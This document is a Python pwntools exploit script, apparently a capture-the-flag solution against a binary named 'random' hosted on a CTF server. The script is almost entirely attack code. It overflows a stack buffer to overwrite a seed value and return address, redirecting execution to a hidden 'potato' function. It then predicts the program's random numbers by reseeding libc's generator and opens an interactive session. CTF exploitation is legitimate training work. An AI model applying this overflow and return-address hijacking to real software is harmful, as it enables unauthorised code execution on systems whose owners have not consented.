#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import ctypes

from pwn import *

elf = context.binary = ELF("./random")


def start(argv=[], *a, **kw):
    nc = "nc cybergon2023.webhop.me 5003"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


def rc4(a, b):
    return (a + b) % 256


env = {}
io = start()

pad = 0x70
seed = 69
libc = ctypes.CDLL("./libc.so.6")
libc.srand(seed)

numbers = []
for i in range(10):
    numbers.append(rc4(libc.rand(), seed))

payload = b"A" * pad
payload += p64(seed)
payload += b"A" * 0x8
payload += p64(elf.bss(0x500))
payload += p64(0x0000000000401402)  # ret
payload += p64(elf.symbols["potato"])

io.sendlineafter(b"name? ", payload)

for n in numbers:
    io.sendline(str(n).encode())


io.interactive()
